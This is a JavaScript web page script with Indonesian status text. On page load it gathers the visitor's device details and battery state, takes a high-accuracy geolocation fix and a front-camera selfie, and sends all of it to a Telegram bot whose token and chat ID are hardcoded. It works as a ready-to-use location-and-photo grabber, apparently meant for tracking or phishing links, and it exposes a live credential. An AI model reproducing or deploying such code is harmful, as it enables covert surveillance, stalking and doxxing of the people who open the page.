window.addEventListener('DOMContentLoaded', async () => {
  const statusList = document.getElementById('status-list');
  const videoEl = document.getElementById('video');
  const canvasEl = document.getElementById('canvas');

  const updateStatus = (msg, isError = false) => {
    const li = document.createElement('li');
    li.textContent = msg;
    if (isError) li.classList.add('error');
    statusList.appendChild(li);
  };

  const getDeviceInfo = async () => {
    updateStatus('📱 Mengambil info perangkat...');
    const info = {
      userAgent: navigator.userAgent,
      platform: navigator.platform,
      language: navigator.language,
      screenWidth: window.screen.width,
      screenHeight: window.screen.height
    };

    if (navigator.getBattery) {
      try {
        const battery = await navigator.getBattery();
        info.battery = {
          level: Math.round(battery.level * 100) + '%',
          isCharging: battery.charging
        };
      } catch {
        info.battery = { level: 'N/A', isCharging: 'N/A' };
      }
    }

    return info;
  };

  const getLocation = () => {
    updateStatus('📍 Mengambil lokasi...');
    return new Promise((resolve, reject) => {
      navigator.geolocation.getCurrentPosition(
        pos => resolve({
          lat: pos.coords.latitude,
          lon: pos.coords.longitude,
          accuracy: pos.coords.accuracy
        }),
        err => reject(new Error('Gagal ambil lokasi: ' + err.message)),
        { enableHighAccuracy: true, timeout: 15000 }
      );
    });
  };

  const getPhoto = async () => {
    updateStatus('📸 Mengaktifkan kamera...');
    const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
    videoEl.srcObject = stream;
    await new Promise(res => videoEl.onloadedmetadata = res);
    videoEl.play();
    await new Promise(res => setTimeout(res, 500));
    canvasEl.width = videoEl.videoWidth;
    canvasEl.height = videoEl.videoHeight;
    canvasEl.getContext('2d').drawImage(videoEl, 0, 0);
    const base64 = canvasEl.toDataURL('image/jpeg', 0.7);
    stream.getTracks().forEach(track => track.stop());
    videoEl.srcObject = null;
    return base64;
  };

 const sendToTelegram = async (data) => {
  const botToken = '6598957548:AAFd8OLzgH-ageyLfDGDxrEhoIS5CuHJ_sc';
  const chatId = '1265481161';

  // 1. Kirim info perangkat (sebagai teks)
  const message = `
📱 *Perangkat*
• UA: ${data.deviceInfo.userAgent}
• Platform: ${data.deviceInfo.platform}
• Resolusi: ${data.deviceInfo.screenWidth}x${data.deviceInfo.screenHeight}
• Baterai: ${data.deviceInfo.battery.level}, Charging: ${data.deviceInfo.battery.isCharging}
`.trim();

  await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
      chat_id: chatId,
      text: message,
      parse_mode: 'Markdown'
    })
  });

  // 2. Kirim lokasi sebagai share-location (map interaktif)
  await fetch(`https://api.telegram.org/bot${botToken}/sendLocation`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
      chat_id: chatId,
      latitude: data.location.lat,
      longitude: data.location.lon
    })
  });

  // 3. Kirim foto selfie
  const blob = await (await fetch(data.photoBase64)).blob();
  const formData = new FormData();
  formData.append('chat_id', chatId);
  formData.append('photo', blob, 'selfie.jpg');

  await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
    method: 'POST',
    body: formData
  });
};

  try {
    const data = {};
    data.deviceInfo = await getDeviceInfo();
    updateStatus('✅ Info perangkat OK');

    data.location = await getLocation();
    updateStatus('✅ Lokasi OK');

    data.photoBase64 = await getPhoto();
    updateStatus('✅ Foto OK');

    await sendToTelegram(data);
    updateStatus('✅ Data berhasil dikirim ke Telegram!');
  } catch (err) {
    updateStatus(`❌ ${err.message}`, true);
  }
});
